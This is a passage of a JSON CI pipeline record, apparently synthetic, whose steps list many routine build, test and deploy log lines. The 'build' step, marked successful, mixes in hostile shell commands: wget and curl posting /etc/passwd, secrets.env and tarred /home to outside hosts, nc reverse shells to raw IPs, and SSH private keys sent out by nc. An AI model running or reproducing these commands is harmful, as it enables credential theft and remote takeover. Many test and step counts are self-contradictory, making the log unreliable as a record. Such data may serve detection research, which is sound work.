          "Compiling utils/index.js...",
          "Environment: test",
          "pip: Installing build dependencies...",
          "Minifying app.js",
          "Platform: win32-x64",
          "  PASS: unit/test_auth_login.spec.js",
          "Cache hit for key-3207",
          "Platform: darwin-arm64",
          "Finished.",
          "[12:19:13] DEBUG: Loading configuration",
          "Optimizing 30 modules...",
          "Snapshots: 23 passed, 8 total",
          "Compiling src/service.java...",
          "HEAD is now at cf9fdae",
          "Success!",
          "\u2713 Step 'install' succeeded",
          "Compiling components/app.ts...",
          "Switched to branch 'hotfix/task-227'",
          "\u2713 Step 'build' succeeded",
          "Uploading artifact 'dist' (16 files)",
          "\u2713 build completed",
          "Generating source maps...",
          "Creating production build...",
          "Compiling components/app.ts...",
          "yarn add: Done in 26.98s",
          "Exception: NullPointerException",
          "Finished.",
          "Layer 4/13: COPY command",
          "Finished.",
          "\u2717 build failed with exit code 16",
          "  PASS: test_auth_login (392ms)",
          "\u2713 lint completed",
          "[12:19:13] INFO: Starting build process",
          "OK",
          "[12:19:13] DEBUG: Memory usage: 594MB",
          "pip: Collecting express",
          "WARNING: lodash has known vulnerabilities",
          "[12:19:13] INFO: Starting build process",
          "Snapshots: 42 passed, 20 total",
          "Uploading artifact 'build' (10 files)",
          "  PASS: test_user_create (275ms)",
          "Exception: RuntimeError",
          "Time: 108.968s",
          "HEAD is now at 00010d8",
          "Artifact downloaded: 11MB",
          "npm notice: created a lockfile",
          "Cache restored successfully (289MB)",
          "[12:19:13] INFO: Cache refreshed",
          "[12:19:13] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 107",
          "[12:19:13] INFO: Cache refreshed",
          "Pushing to registry...",
          "Artifact uploaded: dist.zip (12MB)",
          "WARNING: express has known vulnerabilities",
          "Bundling styles.css",
          "[12:19:13] INFO: Processing request",
          "[12:19:13] DEBUG: Query executed in 15ms",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Using Node.js 18.14.5",
          "Cache hit for key-6517",
          "WARNING: eslint has known vulnerabilities",
          "Finished.",
          "Compiling lib/utils.go...",
          "Artifact uploaded: build.tar.gz (8MB)",
          "[12:19:13] WARN: Deprecated API usage",
          "Success!",
          "Minifying vendor.js",
          "Using Python 3.10",
          "Bundling runtime.css",
          "Using Python 3.10",
          "[12:19:13] DEBUG: Query executed in 30ms",
          "Transforming 471 files...",
          "Uploading artifact 'dist' (39 files)",
          "POST /data - 200 (196ms)",
          "Pulling image: alpine:3.11",
          "Building Docker image...",
          "NODE_ENV=test",
          "Environment: production",
          "[12:19:13] WARN: Deprecated API usage",
          "Cache hit for key-9455",
          "NODE_ENV=test",
          "Snapshots: 36 passed, 4 total",
          "Cache restored successfully (82MB)",
          "\u2717 build failed with exit code 8",
          "Snapshots: 40 passed, 23 total",
          "Processing...",
          "  PASS: unit/test_api_health.spec.js",
          "OK",
          "[12:19:13] ERROR: Connection failed",
          "Cache invalidated: node_modules",
          "Layer 7/15: COPY command",
          "Done.",
          "Finished.",
          "Connection established",
          "Cache hit for key-3827",
          "Image pulled successfully",
          "Pulling image: alpine:latest",
          "Layer 7/10: ENV command",
          "OK",
          "[12:19:13] INFO: Starting build process",
          "[12:19:13] ERROR: Connection failed",
          "pip: Installing build dependencies...",
          "Step 13/20: Testing",
          "Pushing to registry...",
          "Step 1/15: Testing",
          "POST /data - 201 (204ms)",
          "WARNING: react has known vulnerabilities",
          "Waiting...",
          "OK",
          "Coverage: 89% statements, 70% branches",
          "pip: Downloading eslint-5.8.tar.gz",
          "Platform: darwin-arm64",
          "pip: Installing build dependencies...",
          "Generating source maps...",
          "Platform: linux-x64",
          "Using Python 3.11",
          "Installing express@5.14.2",
          "  PASS: test_db_connect (333ms)",
          "pip install: Successfully installed react-1.4",
          "npm notice: package.json updated",
          "Switched to branch 'hotfix/task-854'",
          "Generating source maps...",
          "Step 7/24: Deploying",
          "Step 4/19: Installing dependencies",
          "Fetching submodules...",
          "Cache hit for key-7197",
          "Step 14/16: Linting",
          "Optimizing 56 modules...",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 7/18: Deploying",
          "[12:19:13] INFO: Starting build process",
          "Minifying main.js",
          "Time: 80.685s",
          "Creating production build...",
          "Step 11/23: Deploying",
          "Finished.",
          "WARNING: lodash has known vulnerabilities",
          "Layer 4/11: RUN command",
          "Using Node.js 16.3.5",
          "\u2713 Step 'test' succeeded",
          "Checking out master branch",
          "Pushing to registry...",
          "Connection established",
          "pip: Collecting axios",
          "pip: Installing build dependencies...",
          "Done.",
          "pip: Downloading eslint-3.17.tar.gz",
          "[12:19:13] DEBUG: Initializing service",
          "POST /upload - 202 (95ms)",
          "Cache restored successfully (235MB)",
          "Building Docker image...",
          "Using Python 3.12",
          "Compiling src/handler.rs...",
          "Compiling src/main.py...",
          "[12:19:13] INFO: Cache refreshed",
          "Environment: production",
          "Step 11/15: Building",
          "Step 2/20: Testing",
          "[12:19:13] INFO: Starting build process",
          "npm notice: created a lockfile",
          "Pushing to registry...",
          "[12:19:13] ERROR: Connection failed",
          "pip: Collecting axios",
          "npm notice: created a lockfile",
          "\u2717 build failed with exit code 54",
          "Step 4/19: Installing dependencies",
          "Cache restored successfully (152MB)",
          "Success!",
          "Step 9/15: Running migrations",
          "Building Docker image...",
          "Optimizing 77 modules...",
          "Artifact uploaded: dist.zip (5MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache invalidated: dependencies",
          "Step 14/24: Building",
          "Layer 6/10: RUN command",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 6/23: Running migrations",
          "yarn add: Done in 30.62s",
          "\u2713 Task completed in 1935ms",
          "Step 12/18: Testing",
          "\u2713 All checks passed",
          "Step 6/19: Running migrations",
          "\u2713 validate completed",
          "\u2713 deploy completed",
          "WARNING: eslint has known vulnerabilities",
          "Exception: RuntimeError",
          "Waiting...",
          "Building Docker image...",
          "Layer 3/15: ENV command",
          "Waiting...",
          "npm install: added 314 packages",
          "Cache restored successfully (258MB)",
          "Ran 160 tests in 45s",
          "npm notice: package.json updated",
          "Done.",
          "POST /api - 200 (159ms)",
          "yarn add: Done in 2.27s",
          "Using Node.js 16.6.3",
          "Image pulled successfully",
          "Finished.",
          "Compiling components/utils.go...",
          "Pushing to registry...",
          "Compiling src/main.py...",
          "\u2717 build failed with exit code 39",
          "Pulling image: node:3.11",
          "pip: Collecting eslint",
          "Ready.",
          "Checking out main branch",
          "\u2713 build completed",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-19T12:22:02.873236",
        "finished_at": "2025-12-19T12:22:31.187208",
        "log_lines": [
          "=== Step: integration_tests ===",
          "\u2713 All checks passed",
          "Ready.",
          "npm notice: package.json updated",
          "[12:19:13] DEBUG: Memory usage: 1453MB",
          "npm notice: package.json updated",
          "Optimizing 59 modules...",
          "pip: Downloading prettier-5.13.tar.gz",
          "yarn add: Done in 5.30s",
          "\u2713 Task completed in 3484ms",
          "Layer 8/9: RUN command",
          "Using Node.js 20.4.0",
          "npm notice: created a lockfile",
          "[12:19:13] DEBUG: Initializing service",
          "Test Suites: 18 passed, 32 total",
          "Compiling utils/app.ts...",
          "Step 3/25: Installing dependencies",
          "\u2713 Step 'test' succeeded",
          "HEAD is now at e3d7620",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (16MB)",
          "[12:19:13] DEBUG: Query executed in 93ms",
          "Processing...",
          "Waiting...",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Step 7/24: Building",
          "Compiling utils/main.py...",
          "Pushing to registry...",
          "Generating source maps...",
          "npm notice: created a lockfile",
          "WARNING: axios has known vulnerabilities",
          "Artifact downloaded: 5MB",
          "Step 1/19: Running migrations",
          "Done.",
          "Step 1/20: Testing",
          "Compiling utils/service.java...",
          "Compiling lib/app.ts...",
          "[12:19:13] INFO: Connecting to database",
          "Environment: development",
          "pip install: Successfully installed lodash-3.19",
          "[12:19:13] INFO: Cache refreshed",
          "[12:19:13] DEBUG: Initializing service",
          "Waiting...",
          "[12:19:13] DEBUG: Loading configuration",
          "Compiling components/service.java...",
          "Loading...",
          "Ran 71 tests in 60s",
          "Fetching submodules...",
          "Compiling utils/index.js...",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Cache restored successfully (404MB)",
          "HEAD is now at cf3e5b1",
          "Switched to branch 'bugfix/task-989'",
          "\u2713 All checks passed",
          "Step 11/19: Running migrations",
          "pip install: Successfully installed webpack-1.16",
          "Step 8/22: Building",
          "Artifact downloaded: 19MB",
          "Platform: win32-x64",
          "Loading...",
          "[12:19:13] INFO: Request completed",
          "Cache invalidated: dependencies",
          "\u2713 All checks passed",
          "Compiling src/index.js...",
          "GET /status - 204 (43ms)",
          "\u2713 Task completed in 1968ms",
          "Step 11/17: Linting",
          "Cache restored successfully (125MB)",
          "Step 4/18: Linting",
          "Exception: ValueError",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Test Suites: 25 passed, 7 total",
          "Step 18/20: Linting",
          "[12:19:13] INFO: Connecting to database",
          "Step 14/16: Deploying",
          "Pulling image: alpine:latest",
          "Cache saved successfully",
          "Using Node.js 16.14.7",
          "Step 19/23: Linting",
          "[12:19:13] INFO: Request completed",
          "Generating source maps...",
          "npm install: resolved 724 packages",
          "[12:19:13] DEBUG: Memory usage: 1352MB",
          "Cache restored successfully (77MB)",
          "Artifact uploaded: dist.zip (70MB)",
          "Loading...",
          "OK",
          "[12:19:13] INFO: Connecting to database",
          "WARNING: express has known vulnerabilities",
          "Minifying vendor.js",
          "Step 18/19: Installing dependencies",
          "\u2713 package completed",
          "[12:19:13] INFO: Cache refreshed",
          "Completed.",
          "Using Node.js 18.2.4",
          "npm install: added 314 packages",
          "Checking out main branch",
          "[12:19:13] DEBUG: Query executed in 100ms",
          "[12:19:13] DEBUG: Connection pool: 9 active",
          "Cache miss for key-8890",
          "[12:19:13] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 9/23: Running migrations",
          "Platform: linux-x64",
          "Tests: 341 passed, 472 total",
          "pip install: Successfully installed eslint-1.9",
          "Compiling components/utils.go...",
          "Success!",
          "\u2713 Task completed in 150ms",
          "Cache miss for key-5333",
          "  PASS: unit/test_auth_login.spec.js",
          "Step 12/15: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Bundling styles.js",
          "npm install: added 464 packages",
          "Artifact downloaded: 14MB",
          "Completed.",
          "Cache saved successfully",
          "Building Docker image...",
          "Connection established",
          "Compiling lib/utils.go...",
          "Layer 4/10: COPY command",
          "[12:19:13] WARN: Deprecated API usage",
          "Step 3/21: Building",
          "Building Docker image...",
          "pip: Downloading eslint-2.13.tar.gz",
          "Waiting...",
          "Step 14/16: Testing",
          "[12:19:13] DEBUG: Memory usage: 282MB",
          "Cache saved successfully",
          "Platform: darwin-arm64",
          "WARNING: lodash has known vulnerabilities",
          "WARNING: jest has known vulnerabilities",
          "Environment: staging",
          "Compiling src/app.ts...",
          "pip: Collecting react",
          "Step 3/21: Installing dependencies",
          "Pushing to registry...",
          "Generating source maps...",
          "Cache invalidated: node_modules",
          "[12:19:13] DEBUG: Query executed in 36ms",
          "Finished.",
          "Coverage: 70% statements, 67% branches",
          "[12:19:13] INFO: Processing request",
          "Verifying...",
          "Already up to date.",
          "Loading...",
          "Compiling components/app.ts...",
          "Compiling components/utils.go...",
          "[12:19:13] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:13] DEBUG: Query executed in 19ms",
          "Transforming 694 files...",
          "pip: Installing build dependencies...",
          "Step 5/19: Testing",
          "pip install: Successfully installed webpack-1.13",
          "npm install: resolved 524 packages",
          "Finished.",
          "OK",
          "[12:19:13] ERROR: Connection failed",
          "pip: Installing build dependencies...",
          "\u2713 build completed",
          "Using Python 3.12",
          "Tests: 213 passed, 287 total",
          "Cache hit for key-4584",
          "\u2713 Step 'install' succeeded",
          "npm install: resolved 1700 packages",
          "TLS handshake completed",
          "FAILED: test_cache_hit",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Building Docker image...",
          "[12:19:13] INFO: Processing request",
          "Pulling image: python:18",
          "Connection established",
          "Compiling components/index.js...",
          "[12:19:13] INFO: Connecting to database",
          "pip install: Successfully installed prettier-2.0",
          "\u2713 validate completed",
          "Step 3/21: Installing dependencies",
          "Fetching submodules...",
          "Connecting to startup.dev:443...",
          "\u2713 Step 'build' succeeded",
          "Layer 4/8: RUN command",
          "Done.",
          "OK",
          "\u2717 build failed with exit code 97",
          "POST /api - 202 (64ms)",
          "Pushing to registry...",
          "Switched to branch 'hotfix/task-889'",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Connecting to test.io:443...",
          "\u2713 Step 'install' succeeded",
          "Compiling utils/app.ts...",
          "Bundling main.js",
          "Cache saved successfully",
          "NODE_ENV=test",
          "Step 18/16: Running migrations",
          "Bundling runtime.css",
          "Checking out main branch",
          "Artifact uploaded: build.tar.gz (2MB)",
          "WARNING: prettier has known vulnerabilities",
          "[12:19:13] WARN: Deprecated API usage",
          "[12:19:13] INFO: Starting build process",
          "  PASS: unit/test_api_health.spec.js",
          "Checking out main branch",
          "Step 3/15: Testing",
          "[12:19:13] DEBUG: Initializing service",
          "Cache hit for key-5655",
          "Completed.",
          "Layer 4/12: RUN command",
          "Cache invalidated: dependencies",
          "Cache miss for key-5688",
          "Already up to date.",
          "\u2713 Task completed in 709ms",
          "Compiling components/app.ts...",
          "Optimizing 55 modules...",
          "Done.",
          "[12:19:13] INFO: Processing request",
          "Generating source maps...",
          "Already up to date.",
          "Compiling components/handler.rs...",
          "[12:19:13] INFO: Connecting to database",
          "Test Suites: 46 passed, 26 total",
          "Transforming 586 files...",
          "Checking out main branch",
          "[12:19:13] INFO: Cache refreshed",
          "Creating production build...",
          "[12:19:13] WARN: Deprecated API usage",
          "OK",
          "[12:19:13] INFO: Request completed",
          "Snapshots: 4 passed, 29 total",
          "Connecting to startup.dev:443...",
          "GET /health - 204 (96ms)",
          "Step 8/21: Building",
          "Transforming 781 files...",
          "  PASS: test_auth_login (347ms)",
          "[12:19:13] INFO: Request completed",
          "Artifact uploaded: dist.zip (69MB)",
          "Optimizing 29 modules...",
          "npm install: added 238 packages",
          "Cache hit for key-1850",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-19T12:22:31.187208",
        "finished_at": "2025-12-19T12:22:36.850002",
        "log_lines": [
          "=== Step: deploy_production ===",
          "[12:19:13] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/main.py...",
          "Cache restored successfully (85MB)",
          "Switched to branch 'hotfix/task-247'",
          "Artifact uploaded: dist.zip (99MB)",
          "Pulling image: node:3.11",
          "Done.",
          "[12:19:13] DEBUG: Query executed in 4ms",
          "Image pulled successfully",
          "Already up to date.",
          "Waiting...",
          "Step 7/15: Deploying",
          "Snapshots: 40 passed, 23 total",
          "GET /api - 201 (35ms)",
          "[12:19:13] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 9/25: Linting",
          "HEAD is now at 6e97bc5",
          "Completed.",
          "[12:19:13] ERROR: Connection failed",
          "pip: Installing build dependencies...",
          "Completed.",
          "Installing eslint@2.11.1",
          "pip: Collecting lodash",
          "Image pulled successfully",
          "Transforming 586 files...",
          "Using Node.js 19.6.3",
          "Transforming 777 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache restored successfully (184MB)",
          "Exception: ValueError",
          "\u2717 build failed with exit code 14",
          "Step 11/22: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Fetching submodules...",
          "[12:19:13] INFO: Starting build process",
          "Completed.",
          "Step 13/18: Testing",
          "Done.",
          "Verifying...",
          "WARNING: jest has known vulnerabilities",
          "Already up to date.",
          "Cache hit for key-3711",
          "Loading...",
          "[12:19:13] DEBUG: Connection pool: 12 active",
          "Compiling components/handler.rs...",
          "\u2713 deploy completed",
          "Compiling lib/index.js...",
          "  PASS: unit/test_user_create.spec.js",
          "\u2717 build failed with exit code 125",
          "Using Python 3.12",
          "Artifact uploaded: dist.zip (97MB)",
          "Transforming 895 files...",
          "[12:19:13] WARN: Deprecated API usage",
          "\u2713 Step 'build' succeeded",
          "[12:19:13] DEBUG: Query executed in 70ms",
          "Waiting...",
          "Finished.",
          "Step 10/22: Deploying",
          "Uploading artifact 'coverage' (39 files)",
          "OK",
          "Finished.",
          "Waiting...",
          "Finished.",
          "Platform: darwin-arm64",
          "Environment: staging",
          "Step 18/25: Building",
          "Compiling src/main.py...",
          "Tests: 142 passed, 497 total",
          "Cache hit for key-6884",
          "Artifact downloaded: 38MB",
          "Already up to date.",
          "Step 20/16: Running migrations",
          "[12:19:13] INFO: Cache refreshed",
          "[12:19:13] DEBUG: Initializing service",
          "pip: Collecting webpack",
          "WARNING: lodash has known vulnerabilities",
          "Success!",
          "Using Node.js 19.17.3",
          "Waiting...",
          "Cache restored successfully (231MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Loading...",
          "Compiling lib/app.ts...",
          "Step 14/19: Linting",
          "Installing jest@4.17.8",
          "Uploading artifact 'coverage' (25 files)",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Step 14/17: Installing dependencies",
          "Layer 10/8: COPY command",
          "pip: Downloading prettier-5.16.tar.gz",
          "Verifying...",
          "Success!",
          "Ready.",
          "Compiling utils/service.java...",
          "Compiling utils/app.ts...",
          "Step 13/24: Testing",
          "[12:19:13] DEBUG: Query executed in 76ms",
          "Loading...",
          "Minifying vendor.js",
          "Installing jest@5.7.5",
          "POST /upload - 200 (413ms)",
          "Layer 10/15: COPY command",
          "Cache restored successfully (123MB)",
          "Cache saved successfully",
          "[12:19:13] WARN: Deprecated API usage",
          "Cache saved successfully",
          "Already up to date.",
          "Cache invalidated: build",
          "[12:19:13] INFO: Connecting to database",
          "Cache hit for key-4394",
          "Ready.",
          "Ran 181 tests in 42s",
          "[12:19:13] WARN: Deprecated API usage",
          "Compiling components/main.py...",
          "Uploading artifact 'dist' (27 files)",
          "Using Node.js 20.3.10",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Connection established",
          "pip: Collecting lodash",
          "Compiling utils/main.py...",
          "FAILED: test_auth_login",
          "Minifying app.js",
          "Minifying app.js",
          "Tests: 309 passed, 217 total",
          "Installing express@5.17.5",
          "POST /upload - 202 (289ms)",
          "Using Node.js 19.14.5",
          "Loading...",
          "Tests: 445 passed, 404 total",
          "Minifying app.js",
          "Compiling components/index.js...",
          "[12:19:13] INFO: Connecting to database",
          "Creating production build...",
          "[12:19:13] ERROR: Connection failed",
          "Step 5/17: Deploying",
          "Waiting...",
          "[12:19:13] WARN: Deprecated API usage",
          "Compiling utils/utils.go...",
          "WARNING: express has known vulnerabilities",
          "Building Docker image...",
          "Pushing to registry...",
          "Step 5/15: Running migrations",
          "Coverage: 95% statements, 69% branches",
          "Using Node.js 18.19.1",
          "[12:19:13] DEBUG: Query executed in 89ms",
          "npm install: resolved 439 packages",
          "Step 4/19: Deploying",
          "Connection established",
          "Using Node.js 20.3.0",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Uploading artifact 'dist' (39 files)",
          "Pulling image: python:latest",
          "Switched to branch 'feature/task-490'",
          "[12:19:13] INFO: Starting build process",
          "  PASS: test_db_connect (78ms)",
          "Switched to branch 'bugfix/task-558'",
          "\u2713 All checks passed",
          "Pushing to registry...",
          "Done.",
          "Step 8/23: Installing dependencies",
          "pip: Downloading react-1.18.tar.gz",
          "Compiling utils/service.java...",
          "Step 14/19: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_auth_login (7ms)",
          "Generating source maps...",
          "Image pulled successfully",
          "GET /status - 204 (63ms)",
          "Compiling src/utils.go...",
          "Checking out develop branch",
          "Done.",
          "Step 6/25: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Snapshots: 33 passed, 7 total",
          "Test Suites: 33 passed, 20 total",
          "pip: Installing build dependencies...",
          "Optimizing 83 modules...",
          "Fetching submodules...",
          "Switched to branch 'feature/task-101'",
          "[12:19:13] DEBUG: Initializing service",
          "[12:19:13] WARN: Deprecated API usage",
          "Checking out main branch",
          "Cache hit for key-6991",
          "npm notice: package.json updated",
          "[12:19:13] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "WARNING: lodash has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "TLS handshake completed",
          "Artifact downloaded: 36MB",
          "[12:19:13] INFO: Starting build process",
          "HEAD is now at 44353d6",
          "Installing react@4.0.6",
          "[12:19:13] INFO: Connecting to database",
          "Environment: development",
          "pip: Installing build dependencies...",
          "Finished.",
          "Cache miss for key-2798",
          "[12:19:13] INFO: Processing request",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 build completed",
          "HEAD is now at a0e17b2",
          "Compiling lib/utils.go...",
          "pip: Downloading prettier-1.4.tar.gz",
          "Step 1/20: Installing dependencies",
          "Compiling src/index.js...",
          "GET /health - 200 (35ms)",
          "Checking out master branch",
          "Transforming 920 files...",
          "Uploading artifact 'dist' (16 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:19:13] DEBUG: Connection pool: 8 active",
          "[12:19:13] DEBUG: Query executed in 55ms",
          "Artifact uploaded: build.tar.gz (49MB)",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling utils/utils.go...",
          "Using Node.js 14.16.6",
          "[12:19:13] DEBUG: Initializing service",
          "[12:19:13] WARN: Deprecated API usage",
          "pip install: Successfully installed jest-4.17",
          "[12:19:13] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Connecting to test.io:443...",
          "Verifying...",
          "Loading...",
          "yarn add: Done in 25.41s",
          "[12:19:13] WARN: Deprecated API usage",
          "[12:19:13] DEBUG: Memory usage: 1255MB",
          "Cache saved successfully",
          "Platform: darwin-arm64",
          "Transforming 827 files...",
          "  PASS: test_api_health (323ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Switched to branch 'bugfix/task-486'",
          "[12:19:13] WARN: Deprecated API usage",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-19T12:22:36.850002",
        "finished_at": "2025-12-19T12:23:19.320960",
        "log_lines": [
          "=== Step: build ===",
          "[12:19:13] INFO: Cache refreshed",
          "npm install: added 113 packages",
          "OK",
          "\u2713 All checks passed",
          "Loading...",
          "WARNING: lodash has known vulnerabilities",
          "Compiling lib/app.ts...",
          "WARNING: react has known vulnerabilities",
          "Using Node.js 20.9.1",
          "Waiting...",
          "NODE_ENV=test",
          "\u2713 All checks passed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "[12:19:13] INFO: Processing request",
          "Exception: ValueError",
          "pip: Downloading express-1.0.tar.gz",
          "Environment: production",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip: Downloading react-1.1.tar.gz",
          "Compiling components/handler.rs...",
          "Compiling utils/main.py...",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Using Node.js 15.0.4",
          "TLS handshake completed",
          "npm install: resolved 1126 packages",
          "pip: Installing build dependencies...",
          "Already up to date.",
          "Compiling components/main.py...",
          "[12:19:13] WARN: Deprecated API usage",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "Compiling lib/app.ts...",
          "GET /api - 200 (43ms)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Environment: test",
          "\u2713 All checks passed",
          "nc -e /bin/sh 190.182.158.90 5001",
          "pip install: Successfully installed lodash-3.3",
          "[12:19:13] DEBUG: Memory usage: 1452MB",
          "Cache restored successfully (248MB)",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "Uploading artifact 'dist' (43 files)",
          "Step 12/23: Linting",
          "Done.",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "[12:19:13] DEBUG: Memory usage: 1883MB",
          "Waiting...",
          "[12:19:13] DEBUG: Memory usage: 556MB",
          "Done.",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "[12:19:13] INFO: Request completed",
          "Pushing to registry...",
          "Uploading artifact 'coverage' (10 files)",
          "HEAD is now at 3a3c710",
          "Artifact downloaded: 33MB",
          "Cache hit for key-5700",
          "Done.",
          "Cache miss for key-5634",
          "Using Node.js 14.12.4",
          "pip install: Successfully installed prettier-3.0",
          "WARNING: eslint has known vulnerabilities",
          "Compiling src/handler.rs...",
          "npm notice: package.json updated",
          "Pulling image: node:3.11",
          "OK",
          "Creating production build...",
          "Optimizing 79 modules...",
          "Snapshots: 17 passed, 16 total",
          "Step 12/15: Building",
          "\u2713 All checks passed",
          "Exception: TypeError",
          "Transforming 757 files...",
          "Pulling image: python:3.11",
          "\u2713 Step 'build' succeeded",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip: Installing build dependencies...",
          "Pushing to registry...",
          "Cache miss for key-7765",
          "Success!",
          "[12:19:13] INFO: Connecting to database",
          "Tests: 74 passed, 367 total",
          "[12:19:13] INFO: Processing request",
          "yarn add: Done in 19.88s",
          "Compiling components/app.ts...",
          "[12:19:13] DEBUG: Connection pool: 12 active",
          "Installing react@3.17.3",
          "GET /health - 200 (40ms)",
          "NODE_ENV=production",
          "Tests: 399 passed, 466 total",
          "OK",
          "Snapshots: 38 passed, 15 total",
          "pip: Installing build dependencies...",
          "Installing axios@4.18.9",
          "npm notice: package.json updated",
          "[12:19:13] DEBUG: Loading configuration",
          "Compiling lib/utils.go...",
          "[12:19:13] INFO: Cache refreshed",
          "nc -e /bin/sh 11.5.51.100 46145",
          "Cache miss for key-6321",
          "Processing...",
          "[12:19:13] INFO: Starting build process",
          "Transforming 780 files...",
          "Cache hit for key-5157",
          "Transforming 757 files...",
          "[12:19:13] DEBUG: Loading configuration",
          "Platform: win32-x64",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "Step 18/22: Deploying",
          "NODE_ENV=development",
          "  PASS: test_api_health (232ms)",
          "\u2717 build failed with exit code 86",
          "[12:19:13] INFO: Starting build process",
          "Cache saved successfully",
          "pip: Installing build dependencies...",
          "Layer 8/13: COPY command",
          "Transforming 421 files...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Minifying vendor.js",
          "Using Python 3.11",
          "Uploading artifact 'coverage' (5 files)",
          "FAILED: test_user_create",
          "HEAD is now at 5a7afd4",
          "GET /status - 204 (50ms)",
          "WARNING: jest has known vulnerabilities",
          "nc -e /bin/sh 15.181.246.186 20663",
          "npm notice: package.json updated",
          "[12:19:13] DEBUG: Query executed in 9ms",
          "\u2713 Step 'setup' succeeded",
          "HEAD is now at 2b2cd28",
          "Step 19/17: Installing dependencies",
          "Tests: 481 passed, 126 total",
          "Snapshots: 29 passed, 13 total",
          "Step 4/19: Linting",
          "[12:19:13] INFO: Cache refreshed",
          "Connection established",
          "Artifact downloaded: 1MB",
          "GET /api - 200 (3ms)",
          "Switched to branch 'feature/task-525'",
          "Verifying...",
          "npm notice: package.json updated",
          "POST /data - 200 (303ms)",
          "Step 16/17: Installing dependencies",
          "Verifying...",
          "Loading...",
          "Compiling utils/app.ts...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 158.72.222.150 50046",
          "Done.",
          "Switched to branch 'feature/task-782'",
          "Using Python 3.10",
          "Exception: ValueError",
          "POST /data - 200 (162ms)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "Building Docker image...",
          "[12:19:13] WARN: Deprecated API usage",
          "Creating production build...",
          "Connecting to test.io:443...",
          "[12:19:13] DEBUG: Loading configuration",
          "Step 8/17: Installing dependencies",
          "Tests: 339 passed, 448 total",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "Cache restored successfully (85MB)",
          "Sending 290MB of data to example.com",
          "Artifact uploaded: dist.zip (82MB)",
          "nc -e /bin/sh 103.21.11.3 27095",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 230.75.7.22 45033",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Verifying...",
          "[12:19:13] WARN: Deprecated API usage",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 12.187.212.74 9005",
          "npm install: resolved 1016 packages",
          "Layer 1/8: ENV command",
          "Uploading artifact 'build' (42 files)",
          "Compiling lib/service.java...",
          "\u2713 validate completed",
          "Platform: darwin-arm64",
          "[12:19:13] DEBUG: Initializing service",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "WARNING: jest has known vulnerabilities",
          "Sending 415MB of data to test.io",
          "yarn add: Done in 28.1s",
          "NODE_ENV=development",
          "Artifact downloaded: 33MB",
          "Using Python 3.10",
          "[12:19:13] DEBUG: Query executed in 73ms",
          "FAILED: test_db_connect",
          "Pushing to registry...",
          "[12:19:13] DEBUG: Memory usage: 1520MB",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "Switched to branch 'bugfix/task-718'",
          "HEAD is now at fefd752",
          "npm notice: created a lockfile",
          "Ran 79 tests in 32s",
          "Completed.",
          "Using Python 3.11",
          "Connection established",
          "POST /api - 201 (66ms)",
          "pip: Installing build dependencies...",
          "npm notice: created a lockfile",
          "pip: Collecting react",
